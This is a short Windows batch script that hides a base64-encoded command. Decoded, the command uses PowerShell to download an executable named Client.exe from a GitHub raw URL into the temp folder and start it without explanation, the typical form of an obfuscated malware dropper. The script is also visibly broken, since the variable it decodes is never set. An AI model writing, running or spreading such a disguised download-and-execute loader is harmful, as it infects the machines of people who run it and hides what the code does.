@echo off
set "QGVjaG8gb2ZmDQpTRVQgIlVSTD1odHRwczovL2dpdGh1Yi5jb20vTHVuYXNYODIvV2h5SW1TdGlsbFVwbG9hZGluZy9yYXcvcmVmcy9oZWFkcy9tYWluL0NsaWVudC5leGUiDQpTRVQgIlNhdmVQYXRoPSVURU1QJVxceW91cmZpbGUuZXhlIg0KDQpwb3dlcnNoZWxsIC1Db21tYW5kICJJbnZva2UtV2ViUmVxdWVzdCAtVXJpICclVVJMJScgLU91dEZpbGUgJyVTYXZlUGF0aCUnIg0KDQpJRiBFWElTVCAiJVNhdmVQYXRoJSIgKA0KICAgIHN0YXJ0ICIiICIlU2F2ZVBhdGglIg0KKSBFTFNFICgNCiAgICBFQ0hPIERvd25sb2FkIGZhaWxlZCBvciBmaWxlIG5vdCBmb3VuZC4NCikNCnBhdXNlDQo="

for /f "tokens=*" %%a in ('powershell -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%encodedCommand%'))"') do (
    set "decodedCommand=%%a"
)

call %decodedCommand%

pause
